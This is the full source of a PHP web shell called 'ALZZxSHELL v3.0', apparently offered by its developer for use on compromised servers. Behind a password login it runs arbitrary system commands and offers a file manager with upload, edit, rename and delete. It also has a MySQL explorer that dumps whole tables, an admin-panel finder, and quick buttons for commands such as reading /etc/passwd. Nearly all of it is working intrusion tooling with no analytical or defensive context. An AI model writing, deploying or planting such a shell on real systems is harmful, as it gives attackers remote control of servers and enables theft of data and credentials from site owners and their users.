<?php
/*
    ALZZxSHELL v3.0 — Ultimate Web Shell
    Dev: AlzzIsBack
    Telegram: @alzzisbackv2
    Password: alzz123
*/
$PASSWORD = 'alzzxnxx2011';

if (!isset($_POST['pass']) || $_POST['pass'] !== $PASSWORD) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ALZZxSHELL</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box}body{background:#050505;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Courier New',monospace;color:#c0c0c0;overflow:hidden}
            #bg-canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none}
            .login-box{position:relative;z-index:1;background:rgba(10,10,10,0.9);border:1px solid #cc0033;border-radius:14px;padding:48px 44px;width:380px;box-shadow:0 0 80px rgba(204,0,51,0.08)}
            .login-box .glitch{font-family:'Courier New',monospace;font-size:28px;font-weight:bold;color:#cc0033;text-align:center;letter-spacing:8px;text-shadow:0 0 20px rgba(204,0,51,0.3),0 0 40px rgba(204,0,51,0.1);position:relative;display:inline-block;width:100%}
            .login-box .glitch::before,.login-box .glitch::after{content:'ALZZxSHELL';position:absolute;top:0;left:0;width:100%;height:100%}
            .login-box .glitch::before{color:#ff0040;clip-path:polygon(0 0,100% 0,100% 35%,0 35%);transform:translate(-3px,0);animation:g1 0.3s infinite alternate-reverse}
            .login-box .glitch::after{color:#660022;clip-path:polygon(0 40%,100% 40%,100% 60%,0 60%);transform:translate(3px,0);animation:g2 0.25s infinite alternate-reverse}
            @keyframes g1{0%,100%{transform:translate(-4px,0)}50%{transform:translate(4px,2px)}}
            @keyframes g2{0%,100%{transform:translate(4px,0)}50%{transform:translate(-4px,-2px)}}
            .login-box .sub{text-align:center;color:#333;font-size:9px;letter-spacing:6px;margin:8px 0 28px 0;text-transform:uppercase}
            .login-box .sub svg{display:inline-block;vertical-align:middle;width:80px;height:1px;fill:none;stroke:#333;stroke-width:0.5}
            .login-box input{width:100%;padding:12px 16px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;color:#c0c0c0;font-family:'Courier New',monospace;font-size:13px;outline:none;transition:border 0.3s;margin-bottom:14px}
            .login-box input:focus{border-color:#cc0033;box-shadow:0 0 30px rgba(204,0,51,0.04)}
            .login-box input::placeholder{color:#333}
            .login-box button{width:100%;padding:12px;background:transparent;border:1px solid #cc0033;border-radius:6px;color:#cc0033;font-family:'Courier New',monospace;font-size:13px;font-weight:bold;cursor:pointer;transition:all 0.3s;letter-spacing:4px;text-transform:uppercase}
            .login-box button:hover{background:#cc0033;color:#fff;box-shadow:0 0 40px rgba(204,0,51,0.15)}
            .login-box .error{color:#cc0033;font-size:10px;text-align:center;margin-top:14px;display:none;letter-spacing:2px}
            .login-box .footer{margin-top:18px;text-align:center;font-size:8px;color:#222;letter-spacing:2px}
            .login-box .footer span{color:#cc0033}
            .login-box .scanline{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:2;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.02) 2px,rgba(0,0,0,0.02) 4px)}
            .login-box .corner{position:absolute;width:12px;height:12px;border-color:#cc0033;border-style:solid;border-width:0;opacity:0.3}
            .login-box .corner.tl{top:8px;left:8px;border-top-width:1px;border-left-width:1px}
            .login-box .corner.tr{top:8px;right:8px;border-top-width:1px;border-right-width:1px}
            .login-box .corner.bl{bottom:8px;left:8px;border-bottom-width:1px;border-left-width:1px}
            .login-box .corner.br{bottom:8px;right:8px;border-bottom-width:1px;border-right-width:1px}
            @media(max-width:480px){.login-box{padding:28px 20px;width:92%}.login-box .glitch{font-size:20px;letter-spacing:4px}}
        </style>
    </head>
    <body>
        <canvas id="bg-canvas"></canvas>
        <div class="scanline"></div>
        <div class="login-box">
            <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
            <div class="glitch">ALZZxSHELL</div>
            <div class="sub"><svg viewBox="0 0 80 1"><line x1="0" y1="0.5" x2="80" y2="0.5"/></svg></div>
            <form method="POST">
                <input type="password" name="pass" placeholder="ACCESS CODE" autofocus>
                <button type="submit">unlock</button>
                <div class="error" id="err">invalid credentials</div>
            </form>
            <div class="footer">dev: <span>alzzisback</span> · tg: <span>@alzzisbackv2</span></div>
        </div>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
        <script>
        (function(){
            const canvas=document.getElementById('bg-canvas');
            if(!canvas)return;
            const scene=new THREE.Scene();
            const camera=new THREE.PerspectiveCamera(70,window.innerWidth/window.innerHeight,0.1,1000);
            camera.position.z=25;
            const renderer=new THREE.WebGLRenderer({canvas,alpha:true,antialias:true});
            renderer.setSize(window.innerWidth,window.innerHeight);
            renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
            const count=800;
            const positions=new Float32Array(count*3);
            const colors=new Float32Array(count*3);
            for(let i=0;i<count*3;i++){
                positions[i]=(Math.random()-0.5)*50;
                colors[i]=i%3===0?0.6+Math.random()*0.4:(i%3===1?0.0:0.0);
            }
            const geo=new THREE.BufferGeometry();
            geo.setAttribute('position',new THREE.BufferAttribute(positions,3));
            geo.setAttribute('color',new THREE.BufferAttribute(colors,3));
            const mat=new THREE.PointsMaterial({size:0.12,vertexColors:true,transparent:true,opacity:0.6,blending:THREE.AdditiveBlending});
            const particles=new THREE.Points(geo,mat);
            scene.add(particles);
            const lc=60;
            const lp=new Float32Array(lc*6);
            for(let i=0;i<lc*6;i++)lp[i]=(Math.random()-0.5)*45;
            const lgeo=new THREE.BufferGeometry();
            lgeo.setAttribute('position',new THREE.BufferAttribute(lp,3));
            const lmat=new THREE.LineBasicMaterial({color:0xcc0033,transparent:true,opacity:0.06});
            const lines=new THREE.LineSegments(lgeo,lmat);
            scene.add(lines);
            let t=0;
            function animate(){t+=0.003;particles.rotation.y=t*0.02;particles.rotation.x=Math.sin(t*0.008)*0.01;lines.rotation.y=t*0.015;lines.rotation.x=Math.sin(t*0.006)*0.008;renderer.render(scene,camera);requestAnimationFrame(animate)}
            animate();
            window.addEventListener('resize',()=>{camera.aspect=window.innerWidth/window.innerHeight;camera.updateProjectionMatrix();renderer.setSize(window.innerWidth,window.innerHeight)});
        })();
        document.querySelector('form').addEventListener('submit',function(e){const p=document.querySelector('input[name="pass"]').value;if(p.length<1){e.preventDefault();document.getElementById('err').style.display='block'}});
        </script>
    </body>
    </html>
    <?php
    exit;
}

session_start();
$_SESSION['alzz_auth']=true;

function red($t){return"\033[31m".$t."\033[0m";}
function grn($t){return"\033[32m".$t."\033[0m";}
function ylw($t){return"\033[33m".$t."\033[0m";}
function blu($t){return"\033[34m".$t."\033[0m";}
function execute($cmd){$o=[];$r=0;exec($cmd.' 2>&1',$o,$r);return['output'=>implode("\n",$o),'code'=>$r];}
function getOS(){return strtoupper(substr(PHP_OS,0,3));}
function isWin(){return getOS()==='WIN';}
function humanSize($s){$u=['B','KB','MB','GB','TB'];$i=0;while($s>=1024&&$i<4){$s/=1024;$i++;}return round($s,2).' '.$u[$i];}
function listDir($p){$r=[];$d=[];$f=[];if(is_dir($p)){$i=scandir($p);foreach($i as$it){if($it==='.'||$it==='..')continue;$fu=$p.'/'.$it;if(is_dir($fu))$d[]=$it;else $f[]=$it;}sort($d);sort($f);return array_merge($d,$f);}return[];}
function formatPath($p){$h=getenv('HOME')?:'/root';$p=str_replace($h,'~',$p);return$p;}

$cwd=isset($_SESSION['cwd'])?$_SESSION['cwd']:$_SERVER['DOCUMENT_ROOT'];
$cmd=isset($_POST['cmd'])?$_POST['cmd']:'';
$action=isset($_POST['action'])?$_POST['action']:'';
$target=isset($_POST['target'])?$_POST['target']:'';
$content=isset($_POST['content'])?$_POST['content']:'';
$result='';
$files=[];

if($action==='cd'&&$target){if(is_dir($target)){$cwd=realpath($target);$_SESSION['cwd']=$cwd;}else $result="directory not found: $target";}
if($cmd){$out=execute($cmd);$result=$out['output'];if($out['code']!==0&&empty($result))$result="error code: ".$out['code'];}
if($action==='delete'&&$target){$fu=$cwd.'/'.$target;if(is_file($fu)){if(unlink($fu))$result="deleted: $target";else $result="delete failed";}else $result="not a file";}
if($action==='upload'&&isset($_FILES['file'])){$fl=$_FILES['file'];if($fl['error']===0){$de=$cwd.'/'.$fl['name'];if(move_uploaded_file($fl['tmp_name'],$de))$result="uploaded: ".$fl['name'];else $result="upload failed";}else $result="upload error";}
if($action==='rename'&&$target&&$content){$ol=$cwd.'/'.$target;$ne=$cwd.'/'.$content;if(file_exists($ol)){if(rename($ol,$ne))$result="renamed: $target -> $content";else $result="rename failed";}else $result="file not found";}
if($action==='edit'&&$target&&$content!==''){$fu=$cwd.'/'.$target;if(file_put_contents($fu,$content))$result="saved: $target";else $result="save failed";}

$db_result='';
if($action==='db_connect'&&$target){$dh=isset($_POST['db_host'])?$_POST['db_host']:'localhost';$du=isset($_POST['db_user'])?$_POST['db_user']:'root';$dp=isset($_POST['db_pass'])?$_POST['db_pass']:'';$_SESSION['db_conn']=['host'=>$dh,'user'=>$du,'pass'=>$dp];try{$co=new mysqli($dh,$du,$dp);if($co->connect_error)$db_result="db connection failed: ".$co->connect_error;else{$db_result="connected to mysql";$_SESSION['db_connected']=true;$co->close();}}catch(Exception$e){$db_result="error: ".$e->getMessage();}}
if($action==='db_list'&&isset($_SESSION['db_connected'])){try{$co=new mysqli($_SESSION['db_conn']['host'],$_SESSION['db_conn']['user'],$_SESSION['db_conn']['pass']);if(!$co->connect_error){$dbs=$co->query("SHOW DATABASES");$dl=[];while($ro=$dbs->fetch_assoc())$dl[]=$ro['Database'];$db_result="databases:\n".implode("\n",$dl);$co->close();}}catch(Exception$e){$db_result="error: ".$e->getMessage();}}
if($action==='db_tables'&&$target){try{$co=new mysqli($_SESSION['db_conn']['host'],$_SESSION['db_conn']['user'],$_SESSION['db_conn']['pass']);if(!$co->connect_error&&$co->select_db($target)){$tb=$co->query("SHOW TABLES");$tl=[];while($ro=$tb->fetch_row())$tl[]=$ro[0];$db_result="tables in $target:\n".implode("\n",$tl);$co->close();}}catch(Exception$e){$db_result="error: ".$e->getMessage();}}
if($action==='db_dump'&&$target&&isset($_POST['db_name'])){try{$co=new mysqli($_SESSION['db_conn']['host'],$_SESSION['db_conn']['user'],$_SESSION['db_conn']['pass']);if(!$co->connect_error&&$co->select_db($_POST['db_name'])){$res=$co->query("SELECT * FROM $target");$dump="table: $target\n";$fields=$res->fetch_fields();$dump.="columns: ".implode(', ',array_map(fn($f)=>$f->name,$fields))."\n\n";while($ro=$res->fetch_assoc())$dump.="> ".json_encode($ro)."\n";$db_result=$dump;$co->close();}}catch(Exception$e){$db_result="error: ".$e->getMessage();}}

$admin_result='';
if($action==='find_admin'){$paths=['/admin','/administrator','/admin.php','/admin/login','/admin-panel','/cpanel','/cp','/dashboard','/login','/wp-admin','/wp-login.php','/panel','/control','/admincp','/adminarea','/backend','/administrator/index.php','/admin/index.php','/login.php','/user/login','/staff','/management','/moderator','/sysadmin','/administer','/superadmin','/admin/?','/admin/panel','/cms/admin','/cms/login','/dashboard.php','/admin/dashboard','/admin/home','/admin/control','/admin/panel.php','/admin/login.php'];$base=$target?:$cwd;$found=[];foreach($paths as$p){$url=rtrim($base,'/').$p;$ch=curl_init($url);curl_setopt($ch,CURLOPT_TIMEOUT,3);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch,CURLOPT_NOBODY,true);curl_exec($ch);$code=curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);if($code==200||$code==302||$code==403)$found[]=$url." [".$code."]";}$admin_result=empty($found)?"no admin panel found.":"admin panels found:\n".implode("\n",$found);}

$files=listDir($cwd);
$path_display=formatPath($cwd);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ALZZxSHELL v3.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#050505;font-family:'Courier New',monospace;color:#c0c0c0;padding:16px;min-height:100vh}#bg-canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none}.container{position:relative;z-index:1;max-width:1280px;margin:0 auto}.header{border-bottom:1px solid #1a1a1a;padding-bottom:14px;margin-bottom:18px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}.header .brand{display:flex;align-items:center;gap:14px}.header .brand h1{color:#cc0033;font-size:26px;letter-spacing:6px;font-weight:normal;text-shadow:0 0 30px rgba(204,0,51,0.06)}.header .brand .ver{color:#333;font-size:9px;letter-spacing:3px}.header .info{font-size:9px;color:#444;text-align:right;line-height:1.8}.header .info span{color:#cc0033}.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px}.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}.card{background:rgba(10,10,10,0.85);border:1px solid #1a1a1a;border-radius:8px;padding:14px;margin-bottom:14px}.card .title{font-size:9px;color:#444;letter-spacing:4px;text-transform:uppercase;margin-bottom:8px;border-bottom:1px solid #1a1a1a;padding-bottom:4px}.card .title .badge{color:#cc0033}.card .title .ico{display:inline-block;width:14px;height:14px;vertical-align:middle;margin-right:4px}.card .title .ico svg{width:100%;height:100%;fill:#444}input,select,textarea{background:#0a0a0a;border:1px solid #1a1a1a;border-radius:4px;color:#c0c0c0;padding:6px 10px;font-family:'Courier New',monospace;font-size:11px;outline:none;transition:border 0.3s;width:100%}input:focus,select:focus,textarea:focus{border-color:#cc0033}input::placeholder,textarea::placeholder{color:#333}textarea{resize:vertical;min-height:80px}button{background:transparent;border:1px solid #2a2a2a;border-radius:4px;color:#c0c0c0;padding:4px 14px;font-family:'Courier New',monospace;font-size:10px;cursor:pointer;transition:all 0.3s;white-space:nowrap}button:hover{border-color:#cc0033;color:#cc0033;background:#0a0a0a}button.danger{border-color:#550000;color:#ff4444}button.danger:hover{border-color:#cc0033;background:#1a0a0a}button.success{border-color:#005500;color:#44ff44}button.success:hover{border-color:#00cc00;background:#0a1a0a}.flex{display:flex;gap:6px;flex-wrap:wrap;align-items:center}.flex-grow{flex:1}.file-list{max-height:340px;overflow-y:auto;font-size:11px}.file-list .item{display:flex;justify-content:space-between;align-items:center;padding:3px 6px;border-bottom:1px solid #0a0a0a;transition:background 0.15s}.file-list .item:hover{background:#0a0a0a}.file-list .item .name{color:#c0c0c0;cursor:pointer}.file-list .item .name:hover{color:#cc0033}.file-list .item .name.dir{color:#44aaff}.file-list .item .name.dir:hover{color:#88ccff}.file-list .item .size{color:#444;font-size:9px}.file-list .item .actions{display:flex;gap:3px}.file-list .item .actions button{padding:0 8px;font-size:8px}.output-box{background:#0a0a0a;border:1px solid #1a1a1a;border-radius:4px;padding:10px;font-size:11px;max-height:320px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;font-family:'Courier New',monospace;color:#88ff88}.output-box .error{color:#ff4444}.output-box .warn{color:#ffaa44}.output-box .info{color:#44aaff}.output-box .success{color:#44ff44}.status-bar{background:#0a0a0a;border:1px solid #1a1a1a;border-radius:4px;padding:4px 12px;font-size:9px;color:#444;display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px}.status-bar .path{color:#cc0033}.status-bar .user{color:#44aaff}.admin-result{max-height:160px;overflow-y:auto;font-size:10px;color:#88ff88}.tabs{display:flex;gap:4px;border-bottom:1px solid #1a1a1a;padding-bottom:6px;margin-bottom:10px;flex-wrap:wrap}.tabs .tab{padding:3px 12px;border:1px solid #1a1a1a;border-radius:4px;font-size:10px;cursor:pointer;transition:0.2s;background:transparent;color:#444}.tabs .tab:hover{border-color:#cc0033;color:#c0c0c0}.tabs .tab.active{border-color:#cc0033;color:#cc0033;background:#0a0a0a}.tab-content{display:none}.tab-content.active{display:block}.scroll{max-height:260px;overflow-y:auto}.scroll::-webkit-scrollbar{width:3px}.scroll::-webkit-scrollbar-track{background:#050505}.scroll::-webkit-scrollbar-thumb{background:#333;border-radius:2px}.icon-svg{display:inline-block;width:14px;height:14px;vertical-align:middle;fill:currentColor}.icon-svg-sm{width:12px;height:12px}.icon-svg-lg{width:18px;height:18px}@media(max-width:768px){.grid-2,.grid-3{grid-template-columns:1fr}.header{flex-direction:column;align-items:flex-start}.header .info{text-align:left}}
</style>
</head>
<body>
<canvas id="bg-canvas"></canvas>
<div class="container">

<div class="header">
<div class="brand">
<h1>ALZZxSHELL</h1>
<span class="ver">v3.0</span>
</div>
<div class="info">
dev: <span>alzzisback</span><br>
tg: <span>@alzzisbackv2</span>
</div>
</div>

<div class="status-bar">
<span>path: <span class="path"><?=htmlspecialchars($path_display)?></span></span>
<span>os: <?=getOS()?></span>
<span>user: <?=function_exists('get_current_user')?htmlspecialchars(get_current_user()):'unknown'?></span>
<span>files: <?=count($files)?></span>
</div>

<div class="grid-2">

<div>

<div class="card">
<div class="title"><span class="ico"><svg viewBox="0 0 24 24"><polygon points="12,2 2,7 2,17 12,22 22,17 22,7" stroke="currentColor" stroke-width="1.5" fill="none"/><polygon points="12,2 12,22" stroke="currentColor" stroke-width="1" fill="none"/><polygon points="2,7 22,17" stroke="currentColor" stroke-width="0.5" fill="none"/><polygon points="2,17 22,7" stroke="currentColor" stroke-width="0.5" fill="none"/><circle cx="12" cy="12" r="3" fill="currentColor" opacity="0.5"/></svg></span> command execution</div>
<form method="POST" class="flex" style="gap:4px;">
<input type="hidden" name="action" value="cmd">
<input type="text" name="cmd" placeholder="ls -la / whoami / id" style="flex:1;" autofocus>
<button type="submit">run</button>
</form>
<div class="output-box scroll" id="cmdOutput"><?=!empty($result)?htmlspecialchars($result):'# waiting...'?></div>
</div>

<div class="card">
<div class="title"><span class="ico"><svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" stroke="currentColor" stroke-width="1.5" fill="none"/><circle cx="8.5" cy="8.5" r="2" stroke="currentColor" stroke-width="1.5" fill="none"/><path d="M21 15l-5-5L5 21" stroke="currentColor" stroke-width="1.5" fill="none"/></svg></span> database explorer</div>
<form method="POST" class="flex" style="flex-wrap:wrap;gap:4px;">
<input type="hidden" name="action" value="db_connect">
<input type="text" name="db_host" placeholder="host" value="localhost" style="width:70px;">
<input type="text" name="db_user" placeholder="user" value="root" style="width:70px;">
<input type="password" name="db_pass" placeholder="pass" style="width:70px;">
<button type="submit">connect</button>
</form>
<div class="flex" style="margin-top:4px;gap:4px;flex-wrap:wrap;">
<form method="POST" style="display:inline;"><input type="hidden" name="action" value="db_list"><button type="submit">list db</button></form>
<form method="POST" style="display:inline;"><input type="hidden" name="action" value="db_tables"><input type="text" name="target" placeholder="db name" style="width:100px;display:inline-block;"><button type="submit">tables</button></form>
<form method="POST" style="display:inline;"><input type="hidden" name="action" value="db_dump"><input type="text" name="db_name" placeholder="db" style="width:70px;display:inline-block;"><input type="text" name="target" placeholder="table" style="width:70px;display:inline-block;"><button type="submit">dump</button></form>
</div>
<div class="output-box scroll" style="max-height:130px;"><?=!empty($db_result)?htmlspecialchars($db_result):'# database ready...'?></div>
</div>

<div class="card">
<div class="title"><span class="ico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5" fill="none"/><circle cx="12" cy="12" r="4" fill="currentColor" opacity="0.2"/><path d="M12 2 L12 5 M12 19 L12 22 M2 12 L5 12 M19 12 L22 12" stroke="currentColor" stroke-width="1.5"/></svg></span> admin panel finder</div>
<form method="POST" class="flex" style="gap:4px;">
<input type="hidden" name="action" value="find_admin">
<input type="text" name="target" placeholder="https://target.com" style="flex:1;">
<button type="submit">find</button>
</form>
<div class="admin-result scroll" style="max-height:100px;"><?=!empty($admin_result)?htmlspecialchars($admin_result):'# enter base url'?></div>
</div>

</div>

<div>

<div class="card">
<div class="title"><span class="ico"><svg viewBox="0 0 24 24"><path d="M6 2c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6H6z"/><path d="M13 3v5h5"/></svg></span> file manager <span class="badge"><?=$path_display?></span></div>
<form method="POST" class="flex" style="margin-bottom:4px;">
<input type="hidden" name="action" value="cd">
<input type="text" name="target" placeholder="cd /path" style="flex:1;">
<button type="submit">cd</button>
</form>
<div class="file-list scroll" style="max-height:210px;">
<?php if($files): foreach($files as$file): $fu=$cwd.'/'.$file;$isDir=is_dir($fu);$size=$isDir?'':humanSize(filesize($fu));?>
<div class="item">
<span class="name <?=$isDir?'dir':''?>" onclick="cdFile('<?=addslashes($file)?>')"><?=$isDir?'&#128193;':'&#128196;'?> <?=htmlspecialchars($file)?></span>
<span class="size"><?=$size?></span>
<span class="actions"><?php if(!$isDir):?><button onclick="editFile('<?=addslashes($file)?>')">edit</button><button class="danger" onclick="deleteFile('<?=addslashes($file)?>')">del</button><?php endif;?></span>
</div>
<?php endforeach; else:?><div style="color:#444;padding:6px;">empty</div><?php endif;?>
</div>
</div>

<div class="card">
<div class="title"><span class="ico"><svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg></span> upload</div>
<form method="POST" enctype="multipart/form-data" class="flex" style="gap:4px;">
<input type="hidden" name="action" value="upload">
<input type="file" name="file" style="padding:3px;background:transparent;border:none;color:#444;">
<button type="submit">upload</button>
</form>
<div style="font-size:9px;color:#444;margin-top:2px;">to: <?=htmlspecialchars($path_display)?></div>
</div>

<div class="card">
<div class="title"><span class="ico"><svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></span> rename</div>
<form method="POST" class="flex" style="gap:4px;">
<input type="hidden" name="action" value="rename">
<input type="text" name="target" placeholder="old" style="flex:1;">
<input type="text" name="content" placeholder="new" style="flex:1;">
<button type="submit">rename</button>
</form>
</div>

<div class="card">
<div class="title"><span class="ico"><svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6z"/><path d="M12 13v4m-2-4h4"/></svg></span> edit file</div>
<form method="POST">
<input type="hidden" name="action" value="edit">
<div class="flex" style="margin-bottom:4px;">
<input type="text" name="target" placeholder="filename" style="flex:1;">
<button type="submit">save</button>
</div>
<textarea name="content" rows="4" placeholder="content..."></textarea>
</form>
</div>

</div>
</div>

<div class="card">
<div class="title"><span class="ico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5" fill="none"/><path d="M12 8 L12 12 M12 16 L12.01 16" stroke="currentColor" stroke-width="1.5"/></svg></span> system info</div>
<div class="grid-3" style="font-size:10px;color:#666;">
<div>php: <?=phpversion()?></div>
<div>server: <?=$_SERVER['SERVER_SOFTWARE']??'unknown'?></div>
<div>doc root: <?=$_SERVER['DOCUMENT_ROOT']??'unknown'?></div>
<div>user agent: <?=htmlspecialchars($_SERVER['HTTP_USER_AGENT']??'')?></div>
<div>client ip: <?=$_SERVER['REMOTE_ADDR']??'unknown'?></div>
<div>memory: <?=ini_get('memory_limit')?></div>
</div>
</div>

<div class="card">
<div class="title"><span class="ico"><svg viewBox="0 0 24 24"><path d="M4 3h16v2H4zM4 7h16v2H4zM4 11h16v2H4zM4 15h10v2H4zM4 19h16v2H4z"/></svg></span> quick commands</div>
<div class="flex" style="gap:3px;flex-wrap:wrap;">
<button onclick="setCmd('whoami')">whoami</button>
<button onclick="setCmd('id')">id</button>
<button onclick="setCmd('pwd')">pwd</button>
<button onclick="setCmd('ls -la')">ls -la</button>
<button onclick="setCmd('ps aux')">ps aux</button>
<button onclick="setCmd('netstat -tulpn')">netstat</button>
<button onclick="setCmd('df -h')">df -h</button>
<button onclick="setCmd('free -m')">free -m</button>
<button onclick="setCmd('uname -a')">uname</button>
<button onclick="setCmd('cat /etc/passwd')">passwd</button>
<button onclick="setCmd('find . -name *.php')">find php</button>
</div>
</div>

<div style="text-align:center;font-size:7px;color:#1a1a1a;padding:12px 0;border-top:1px solid #0a0a0a;margin-top:6px;letter-spacing:4px;">
alzzxshell v3.0 · dev: alzzisback · tg: @alzzisbackv2
</div>
</div>

<script>
function setCmd(c){document.querySelector('input[name="cmd"]').value=c;document.querySelector('input[name="cmd"]').focus();document.querySelector('form').submit();}
function cdFile(n){const i=document.querySelector('input[name="target"]');if(i&&i.closest('form').querySelector('input[name="action"]').value==='cd'){i.value=n;i.closest('form').submit();}}
function editFile(n){document.querySelector('input[name="target"]').value=n;document.querySelector('textarea[name="content"]').focus();}
function deleteFile(n){if(confirm('delete '+n+'?')){const f=document.createElement('form');f.method='POST';f.innerHTML='<input type="hidden" name="action" value="delete"><input type="hidden" name="target" value="'+n+'">';document.body.appendChild(f);f.submit();}}
const outs=document.querySelectorAll('.output-box');outs.forEach(e=>{e.scrollTop=e.scrollHeight;});
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
<script>
(function(){
const c=document.getElementById('bg-canvas');if(!c)return;
const s=new THREE.Scene();
const cam=new THREE.PerspectiveCamera(70,window.innerWidth/window.innerHeight,0.1,1000);
cam.position.z=28;
const r=new THREE.WebGLRenderer({canvas:c,alpha:true,antialias:true});
r.setSize(window.innerWidth,window.innerHeight);r.setPixelRatio(Math.min(window.devicePixelRatio,2));
const ct=900;const p=new Float32Array(ct*3);const cl=new Float32Array(ct*3);
for(let i=0;i<ct*3;i++){p[i]=(Math.random()-0.5)*55;cl[i]=i%3===0?0.6+Math.random()*0.4:(i%3===1?0.0:0.0);}
const g=new THREE.BufferGeometry();g.setAttribute('position',new THREE.BufferAttribute(p,3));g.setAttribute('color',new THREE.BufferAttribute(cl,3));
const m=new THREE.PointsMaterial({size:0.1,vertexColors:true,transparent:true,opacity:0.5,blending:THREE.AdditiveBlending});
const pt=new THREE.Points(g,m);s.add(pt);
const lc=80;const lp=new Float32Array(lc*6);for(let i=0;i<lc*6;i++)lp[i]=(Math.random()-0.5)*50;
const lg=new THREE.BufferGeometry();lg.setAttribute('position',new THREE.BufferAttribute(lp,3));
const lm=new THREE.LineBasicMaterial({color:0xcc0033,transparent:true,opacity:0.04});
const ln=new THREE.LineSegments(lg,lm);s.add(ln);
let t=0;
function anim(){t+=0.002;pt.rotation.y=t*0.015;pt.rotation.x=Math.sin(t*0.006)*0.01;ln.rotation.y=t*0.012;ln.rotation.x=Math.sin(t*0.005)*0.008;r.render(s,cam);requestAnimationFrame(anim)}
anim();
window.addEventListener('resize',()=>{cam.aspect=window.innerWidth/window.innerHeight;cam.updateProjectionMatrix();r.setSize(window.innerWidth,window.innerHeight)});
})();
</script>
</body>
</html>
